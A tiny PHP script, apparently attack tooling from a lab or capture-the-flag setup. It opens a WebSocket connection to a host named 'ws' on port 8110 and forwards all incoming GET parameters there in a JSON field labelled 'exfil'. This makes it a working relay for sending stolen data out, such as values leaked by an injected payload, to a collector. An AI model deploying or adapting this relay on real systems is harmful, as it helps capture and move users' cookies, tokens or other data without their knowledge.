<?php

require '_loader.php';


$client = new Hoa\Websocket\Client(
    new Hoa\Socket\Client('ws://ws:8110')
);

$client->setHost('ws');
$client->connect();
$client->send(json_encode(["exfil" => $_GET]));